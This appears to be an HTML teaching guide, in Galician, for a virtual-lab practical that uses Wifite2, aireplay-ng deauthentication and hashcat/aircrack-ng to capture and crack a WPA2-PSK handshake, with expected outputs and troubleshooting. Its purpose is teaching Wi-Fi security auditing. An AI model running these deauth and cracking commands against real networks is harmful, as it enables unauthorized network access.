@@ -1,0 +1,271 @@
+<!doctype html><html lang="gl"><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Guía da práctica Wifite 1.1 — Auditoría WPA2-PSK</title><style>
+:root{color-scheme:light dark}body{font:16px/1.58 system-ui,Arial;margin:0;background:#f7f9fb;color:#1c2e3d}.wrap{max-width:940px;margin:0 auto;padding:22px 28px 70px}a{color:#1460a0}header{position:sticky;top:0;background:#12334d;color:#fff;padding:12px 26px}header a{color:#fff}article{background:white;border-radius:16px;padding:25px 36px;box-shadow:0 4px 20px #18364f11}h1{font-size:1.7rem;line-height:1.25}h2{font-size:1.35rem;margin-top:2rem;border-bottom:1px solid #d7e0e7;padding-bottom:.4rem}h3{font-size:1.1rem}pre{padding:14px 18px;background:#11283a;color:#e4f5ff;overflow:auto;border-radius:9px;white-space:pre}pre code{font:13px/1.5 ui-monospace,Consolas,monospace}p code,li code{background:#e8eff5;padding:2px 4px;border-radius:4px}table{border-collapse:collapse;display:block;overflow:auto}td,th{border:1px solid #d4e0ea;padding:8px;text-align:left}img{max-width:100%;height:auto}blockquote{border-left:4px solid #14a3b8;padding:2px 12px;background:#eff7f9}.notice{padding:10px 15px;border-left:4px solid #16a5bd;background:#eff9fc;border-radius:6px}.notice.warning{border-color:#db7e26;background:#fff7eb}.notice strong{display:block} @media(max-width:640px){.wrap{padding:12px}article{padding:15px}} </style><header><a href="../index.html">← Volver ao laboratorio interactivo</a> · Guía docente validada</header><main class="wrap"><article><h1>Guía da práctica Wifite 1.1 — Auditoría WPA2-PSK</h1>
+<div class="notice warning"><strong>**LIMITACIÓN DE RESPONSABILIDADE**</strong>
+<p>O autor do presente documento declina calquera responsabilidade asociada ao uso incorrecto e/ou malicioso que puidese realizarse coa información exposta no mesmo. Este documento foi xerado para uso didáctico e debe ser empregado en contornas privadas e virtuais controladas co permiso correspondente do administrador desas contornas.<br />
+O uso de Wifite ou calquera outra ferramenta de auditoría en redes Wi-Fi sen autorización expresa é <strong>ILEGAL</strong>.</p>
+</div>
+<h2>1. Resumo</h2>
+<p>Esta práctica introduce o uso de <strong>Wifite2</strong> como ferramenta automatizada para auditar redes Wi-Fi WPA2-PSK nun entorno controlado de laboratorio. O escenario xa está aprovisionado por <code>wifilabctl</code>; o estudante opera directamente a ferramenta de ataque.</p>
+<p><strong>Obxectivos de aprendizaxe:</strong></p>
+<ul>
+<li>Empregar Wifite para automatizar captura de handshakes WPA2</li>
+<li>Auditar o contrasinal capturado con wordlist rockyou</li>
+<li>Comprender as limitacións e capacidades de ferramentas automatizadas</li>
+<li>Contrastar co método manual <a href="./1.1-ATAQUE_WPA2_PSK.html">1.1-ATAQUE_WPA2_PSK.md</a>{:target=&quot;_blank&quot;}</li>
+</ul>
+<hr />
+<h2>2. Material necesario</h2>
+<p><strong>Hardware/Software:</strong></p>
+<ul>
+<li>Host alumnado</li>
+<li>Máquina virtual GNU/Linux Kali amd64</li>
+<li>RAM ≥ 2048MB</li>
+<li>CPU ≥ 2 cores</li>
+<li>PAE/NX habilitado</li>
+<li>ISO: Kali Live amd64</li>
+</ul>
+<p><strong>Ferramentas:</strong></p>
+<ul>
+<li><code>wifite</code></li>
+<li><code>hostapd</code></li>
+<li><code>wpa_supplicant</code></li>
+<li><code>mac80211_hwsim</code></li>
+<li><code>aircrack-ng</code> suite (aireplay-ng, airodump-ng)</li>
+<li><code>tshark</code> (análise de tramas)</li>
+<li><code>hashcat</code>, <code>pocl-opencl-icd</code> e <code>clinfo</code> (verificación de contrasinais coa CPU mediante OpenCL)</li>
+<li>Wordlist: <code>/usr/share/wordlists/rockyou.txt.gz</code></li>
+</ul>
+<p><strong>Referencias:</strong></p>
+<ul>
+<li>[0] <a href="https://raw.githubusercontent.com/ricardofc/repoEDU-CCbySA/main/HE/Taller/Wi-Fi/1-Taller-HE-Practica-WiFi-1.pdf">1-Taller-HE-Practica-WiFi-1.pdf</a>{:target=&quot;_blank&quot;}</li>
+<li>[1] <a href="https://raw.githubusercontent.com/ricardofc/repoEDU-CCbySA/main/HE/Taller/Wi-Fi/1-Taller-HE-Practica-WiFi-2.pdf">1-Taller-HE-Practica-WiFi-2.pdf</a>{:target=&quot;_blank&quot;}</li>
+</ul>
+<hr />
+<h2>3. Escenario e topoloxía</h2>
+<p>| Rol               | Interface | Namespace             | IP               | Estado tras <code>wifilabctl up</code> |
+|-------------------|-----------|-----------------------|------------------|-----------------------------|
+| AP WPA2-PSK       | <code>wlan0</code>   | <code>wifi_ap_wlan0</code>       | <code>192.168.10.1</code>   | ✅ Automático                |
+| Cliente WPA2      | <code>wlan1</code>   | <code>wifi_cliente_wlan1</code>  | <code>192.168.10.2</code>   | ✅ Automático                |
+| Atacante (Wifite) | <code>wlan2</code>   | (global)              | —                | ⏳ Interface libre           |
+| Monitor adicional | <code>wlan3</code>   | (global)              | —                | ⏳ Interface libre           |</p>
+<p><strong>SSID:</strong> <code>EMPRESA-XYZ</code> · <strong>Contrasinal:</strong> <code>spongebob19</code> · <strong>Canal:</strong> 6</p>
+<pre><code>[wlan1: Cliente PSK]  ----wireless----&gt; [wlan0: AP WPA2-PSK]
+                                              ^
+                                              |
+                                    [wlan2mon: Wifite]
+                                    (captura handshake → aircrack-ng)
+</code></pre>
+<hr />
+<h2>4. Procedemento</h2>
+<p><strong>Resumo de terminais:</strong></p>
+<p>| Terminal | Rol                                                |
+|----------|----------------------------------------------------|
+| 1        | Arrancar o escenario e verificacións               |
+| 2        | Executar Wifite + cracking automático              |</p>
+<hr />
+<h3>Terminal 1 — Arrancar o escenario</h3>
+<pre><code class="language-bash"># Arrancar o escenario PSK
+sudo wifilabctl up psk
+
+# Verificar que AP e cliente están activos
+sudo wifilabctl status
+</code></pre>
+<p>Saída esperada:</p>
+<pre><code>[*] Informe de Estado do Laboratorio
+============================================================
+NAMESPACE                 INTERFACE       IP                   ESTADO
+---------------------------------------------------------------------------
+wifi_cliente_wlan1        wlan1           192.168.10.2/24      UP
+wifi_ap_wlan0             wlan0           192.168.10.1/24      UP
+---------------------------------------------------------------------------
+Interfaces GLOBAIS / ATACANTE:
+(global)                  wlan2           (host/monitor)       LISTO
+(global)                  wlan3           (host/monitor)       LISTO
+</code></pre>
+<blockquote>
+<p>⚠️ Se o cliente aínda non aparece como conectado, espera 5-10 segundos e repite <code>wifilabctl status</code>.</p>
+</blockquote>
+<hr />
+<h3>Terminal 2 — Auditoria con Wifite</h3>
+<p>Abre unha <strong>segunda terminal grafica como <code>kali</code></strong>. Nela executaras Wifite con <code>sudo</code>; manten a primeira terminal dispoñible para comprobar o estado do escenario.</p>
+<h3>Paso 1: Preparar o dicionario de contrasinais</h3>
+<pre><code class="language-bash"># Descomprimir rockyou soamente se ainda non existe en texto plano
+if [ ! -f /usr/share/wordlists/rockyou.txt ]; then
+    sudo gzip -dk /usr/share/wordlists/rockyou.txt.gz
+fi
+
+# Comprobar o dicionario
+ls -lh /usr/share/wordlists/rockyou.txt
+</code></pre>
+<h3>Comprobar que Hashcat pode utilizar OpenCL</h3>
+<p>Wifite pode empregar <strong>Hashcat (modo 22000)</strong> para comprobar os candidatos da lista Rockyou.
+Hashcat precisa unha plataforma de cálculo OpenCL, CUDA ou HIP. Neste laboratorio
+virtualizado utilizamos <strong>PoCL</strong>, que proporciona OpenCL sobre a CPU, sen precisar GPU.
+A instalación automatizada do laboratorio xa incorpora os paquetes necesarios.</p>
+<p>Antes de executar Wifite comproba:</p>
+<pre><code class="language-bash">clinfo -l
+hashcat -I
+</code></pre>
+<p>Debe aparecer unha plataforma PoCL e un dispositivo de cálculo dispoñible.
+Se non aparecen (por exemplo, <code>CL_PLATFORM_NOT_FOUND_KHR</code>), instala as dependencias:</p>
+<pre><code class="language-bash">sudo apt update
+sudo apt install -y pocl-opencl-icd clinfo
+</code></pre>
+<p>Repite as dúas comprobacións. <strong>Un erro de OpenCL non significa que o handshake sexa inválido.</strong></p>
+<h3>Paso 2: Lanzar Wifite</h3>
+<pre><code class="language-bash">sudo wifite --no-wps --dict /usr/share/wordlists/rockyou.txt
+</code></pre>
+<blockquote>
+<p><code>sudo</code>: Wifite necesita privilexios de administrador para xestionar a interface sen fios. Non fai falta abrir unha shell de root.<br />
+<code>--no-wps</code>: Omitir ataques WPS (non procede neste escenario)<br />
+<code>--dict</code>: Dicionario de contrasinais para comprobación offline (Wifite pode empregar Hashcat ou outras ferramentas segundo a súa configuración)</p>
+</blockquote>
+<h3>Paso 3: Avisos de procesos en conflito (normal)</h3>
+<p>Wifite detectará os procesos do escenario (<code>hostapd</code>, <code>wpa_supplicant</code>) e avisará:</p>
+<pre><code> [!] Conflicting processes: NetworkManager (PID 642), wpa_supplicant (PID 1919),
+     hostapd (PID 2009), wpa_supplicant (PID 2024)
+ [!] If you have problems: kill -9 PID or re-run wifite with --kill
+</code></pre>
+<blockquote>
+<p>⚠️ <strong>Non matar eses procesos.</strong> Son o AP e o cliente do escenario de laboratorio. Ignora o aviso e continúa.</p>
+</blockquote>
+<h3>Paso 4: Seleccionar a interface de ataque</h3>
+<p>A diferenza dun sistema con tarxeta Wi-Fi física, Wifite <strong>non selecciona automaticamente</strong> a interface — lista <code>wlan2</code> e <code>wlan3</code> (as dúas interfaces globais do escenario) e pide escoller:</p>
+<pre><code>    Interface   PHY   Driver              Chipset
+-----------------------------------------------------------------------
+ 1. wlan2       phy2  ??????              non-mac80211 device? (report this!)
+ 2. wlan3       phy3  ??????              non-mac80211 device? (report this!)
+ [+] Select wireless interface (1-2): 1
+</code></pre>
+<p>Introducir <code>1</code> para seleccionar <code>wlan2</code> e premer Enter.</p>
+<blockquote>
+<p>💡 O aviso <code>non-mac80211 device?</code> é normal con <code>mac80211_hwsim</code> en algunhas versións de Wifite. Non impide o funcionamento.</p>
+</blockquote>
+<pre><code> [+] Enabling monitor mode on wlan2... enabled!
+</code></pre>
+<h3>Paso 5: Escaneo e selección do AP obxectivo</h3>
+<p>Wifite escaneará en modo monitor. Cando apareza <code>EMPRESA-XYZ</code> premer <code>Ctrl+C</code>:</p>
+<pre><code>   NUM                      ESSID   CH  ENCR    PWR    WPS  CLIENT
+   ---  -------------------------  ---  -----   ----   ---  ------
+     1               EMPRESA-XYZ     6  WPA-P   72db    no
+</code></pre>
+<p>Seleccionar o AP:</p>
+<pre><code> [+] Select target(s) (1-1) separated by commas, dashes or all: 1
+</code></pre>
+<p>Introducir <code>1</code> e premer Enter.</p>
+<h3>Paso 6: Intento de captura PMKID (resultado non garantido)</h3>
+<p>Wifite intentará primeiro capturar o PMKID antes do handshake. Nesta practica a captura PMKID <strong>non esta garantida</strong> (ver <a href="https://raw.githubusercontent.com/ricardofc/repoEDU-CCbySA/main/HE/Taller/Wi-Fi/1-Taller-HE-Practica-WiFi-3.pdf">Práctica 1-3</a>{:target=&quot;_blank&quot;}). Esperar que apareza ou premer <code>Ctrl+C</code> para cancelalo e logo introducir <code>c</code> para continuar co seguinte ataque.</p>
+<pre><code> [+] (1/1) Starting attacks against 06:FE:D8:7D:4F:43 (EMPRESA-XYZ)
+ [+] EMPRESA-XYZ (72db) PMKID CAPTURE: Waiting for PMKID (4m47s) ^C
+ [!] Interrupted
+ [+] 1 attack(s) remain
+ [+] Do you want to continue attacking, or exit (c, e)? c
+</code></pre>
+<h3>Paso 7: Captura do handshake WPA (segundo ataque automático)</h3>
+<p>Tras cancelar o PMKID, Wifite pasa ao ataque de captura de handshake:</p>
+<pre><code> [+] EMPRESA-XYZ (72db) WPA Handshake capture: Waiting for target to appear..
+ [+] EMPRESA-XYZ (72db) WPA Handshake capture: Listening. (clients:0, deauth:...)
+</code></pre>
+<p>Wifite executará internamente:</p>
+<ol>
+<li><code>airodump-ng wlan2mon -c 6 --bssid &lt;BSSID&gt;</code> → captura en modo monitor</li>
+<li><code>aireplay-ng --deauth 5 -a &lt;BSSID_AP&gt; -c &lt;MAC_CLIENTE&gt; wlan2mon</code> → forza reconexión</li>
+<li>Captura o handshake 4-Way cando o cliente se reconecta</li>
+</ol>
+<blockquote>
+<p>⚠️ Se <code>clients:0</code> persiste moito tempo, o cliente aínda non está conectado. Verificar con <code>sudo wifilabctl status</code> nunha terceira terminal e esperar que <code>wifi_cliente_wlan1</code> apareza <code>UP</code>.</p>
+</blockquote>
+<p>Saída esperada cando captura o handshake:</p>
+<pre><code> [+] EMPRESA-XYZ (72db) WPA Handshake capture: Captured handshake
+</code></pre>
+<h3>Paso 8: Comprobación automática da clave con Hashcat</h3>
+<pre><code> [+] Cracking WPA/WPA2 Handshake: Running Hashcat with rockyou.txt wordlist
+ [+] Attempting to crack WPA/WPA2 hash using Hashcat mode 22000
+ [+] Cracked WPA/WPA2 Handshake Key:
+
+ [+]  Access Point Name: EMPRESA-XYZ
+ [+]  Access Point BSSID: 06:FE:D8:7D:4F:43
+ [+]          Encryption: WPA
+ [+]      Handshake File: /root/hs/handshake_EMPRESAXYZ_06-FE-D8-7D-4F-43_*.cap
+ [+]      PSK (password): spongebob19
+ [+] saved crack result to cracked.json (1 total)
+</code></pre>
+<p>Se Hashcat verifica o candidato, a clave de proba é <code>spongebob19</code>. O resultado dependerá de que se detecte unha plataforma de cálculo e de que a captura sexa válida.</p>
+<h3>Paso 9: Revisar ficheiros xerados</h3>
+<pre><code class="language-bash"># Wifite garda ficheiros en /root/hs/
+sudo ls -lh /root/hs/
+
+# Ver resultado crackeado
+sudo cat /root/cracked.json
+</code></pre>
+<hr />
+<h3>Se Hashcat indica que non hai dispositivo de cálculo</h3>
+<p>As mensaxes <code>CL_PLATFORM_NOT_FOUND_KHR</code> ou <code>No OpenCL, HIP or CUDA compatible platform found</code>
+indican que <strong>non existe un runtime de cálculo dispoñible</strong>, non que o contrasinal non estea no dicionario.
+Verifica <code>clinfo -l</code> e <code>hashcat -I</code> e, se falta PoCL, instálao cos comandos anteriores.
+Unha vez detectado o dispositivo, repite a auditoría con Wifite.</p>
+<p>Se xa existe unha captura, tamén podes verificar a clave coa ferramenta manual:</p>
+<pre><code class="language-bash"># Substituír o nome polo ficheiro CAP real gardado en /root/hs/
+sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt /root/hs/NOME-DA-CAPTURA.cap
+</code></pre>
+<h3>Se Wifite amosa <code>KEY UNKNOWN</code></h3>
+<p>Que Wifite descubra <code>EMPRESA-XYZ</code> e o seu cliente <strong>non significa</strong> que capturase un intercambio EAPOL utilizable nin que o dicionario conseguise recuperar a PSK. O resultado <code>KEY UNKNOWN</code> pode deberse tamén a que Hashcat non dispoña de OpenCL: comproba primeiro <code>hashcat -I</code>. Non o confundas con <code>KEY FOUND</code>.</p>
+<p><strong>Comprobacion 1: o cliente segue asociado ao AP?</strong> Desde a terminal do escenario:</p>
+<pre><code class="language-bash">sudo ip netns exec wifi_cliente_wlan1 iw dev wlan1 link
+</code></pre>
+<p><strong>Comprobacion 2: o dicionario existe e conten a clave de proba do laboratorio?</strong></p>
+<pre><code class="language-bash">ls -lh /usr/share/wordlists/rockyou.txt
+grep -Fx 'spongebob19' /usr/share/wordlists/rockyou.txt
+</code></pre>
+<p>Se <code>grep</code> non devolve nada, ese dicionario non contén a clave e non poderá recuperala, mesmo cun handshake correcto.</p>
+<p><strong>Comprobacion 3: Wifite gardou unha captura?</strong> No escenario de exemplo os ficheiros están habitualmente en <code>/root/hs/</code> porque se executou Wifite mediante <code>sudo</code>:</p>
+<pre><code class="language-bash">sudo find /root/hs -maxdepth 1 -type f -name '*.cap' -ls
+</code></pre>
+<p>Se existe unha captura, escolle o seu <strong>nome exacto</strong> e analiza o tráfico (substitúe <code>NOME-DA-CAPTURA.cap</code> polo ficheiro real):</p>
+<pre><code class="language-bash">CAP='/root/hs/NOME-DA-CAPTURA.cap'
+sudo tshark -r &quot;$CAP&quot; -Y eapol -T fields \
+  -e frame.number -e wlan.sa -e wlan.da \
+  -e wlan_rsna_eapol.keydes.msgnr
+sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt &quot;$CAP&quot;
+</code></pre>
+<p>Se <strong>non existe captura</strong>, Wifite non gardou un handshake aproveitable: cómpre revisar a reconexión e o proceso de captura. Se <strong>existen tramas EAPOL</strong>, aínda hai que comprobar que pertencen á mesma asociación AP-cliente e que o material é suficiente para verificar unha PSK. Se <code>aircrack-ng</code> indica que non hai handshakes válidos, non se trata dun fallo do dicionario. Se detecta un handshake válido, pero non atopa a clave, revisa o dicionario e que a PSK configurada sexa a esperada.</p>
+<p>Non utilices <code>wifite --kill</code> para tentar solucionalo: podería deter <code>hostapd</code> ou <code>wpa_supplicant</code>, que son necesarios no laboratorio. Tampouco hai que asumir que a captura PMKID funcionará neste escenario.</p>
+<h3>Terminal 2 — Verificación manual do handshake</h3>
+<pre><code class="language-bash"># Comprobar que o handshake é válido (o BSSID real verase en /root/hs/)
+sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt /root/hs/handshake_EMPRESAXYZ_*.cap
+
+# Extraer información EAPOL
+sudo tshark -r /root/hs/handshake_EMPRESAXYZ_*.cap -Y &quot;eapol&quot; -V | grep -i &quot;key&quot;
+</code></pre>
+<p>Saída de aircrack-ng cando ten éxito:</p>
+<pre><code>                                 KEY FOUND! [ spongebob19 ]
+
+      Master Key     : 00 35 42 60 BF F4 F0 DC 57 FA 6D 2C FF 97 F0 34
+                       A2 F0 A5 7F EA 29 83 79 19 35 57 80 1A 63 40 EF
+      Transient Key  : 84 79 3D 95 50 43 3E 7E F4 7B 41 6F 33 E6 DE 26
+                       69 3B 4A AF 14 93 30 0A 01 AB 9D 44 1C 6E CE A3
+                       C2 5E 18 FE F1 43 A4 2F 54 CE 7A B8 E2 FF 69 00
+                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+      EAPOL HMAC     : 08 0F C2 1D 29 48 2A AE B3 66 CF 49 88 6A 04 C3
+</code></pre>
+<hr />
+<h2>5. Limitacións de Wifite e alternativa didáctica</h2>
+<p><strong>Wifite2 é unha ferramenta AUTOMATIZADA</strong> que simplifica moitos pasos, pero ten limitacións:</p>
+<ol>
+<li><strong>Deautenticación pode fallar</strong> se o cliente non reacciona aos paquetes deauth (timing, PMF, ou configuración de mac80211_hwsim).</li>
+<li><strong>Non ofrece control fino</strong> sobre parámetros de captura (canal, tempo de espera, número de deauth).</li>
+<li><strong>Wordlist por defecto</strong> pode non estar optimizada para este escenario.</li>
+</ol>
+<hr />
+<h2>6. Limpeza do laboratorio</h2>
+<p><strong>Terminal 1:</strong></p>
+<pre><code class="language-bash"># Deter e eliminar o escenario completamente
+sudo wifilabctl reset
+
+# Verificar que non quedan namespaces
+ip netns list
+</code></pre>
+<p><strong>Terminal 2</strong> (se wlan2 quedou en modo monitor):</p>
+<pre><code class="language-bash">sudo airmon-ng stop wlan2mon
+</code></pre>
+</article><p>Fonte: Markdown orixinal de <code>20261121_docs.he-ud2.zip</code>. O procedemento debe executarse exclusivamente no laboratorio docente autorizado.</p></main></html>
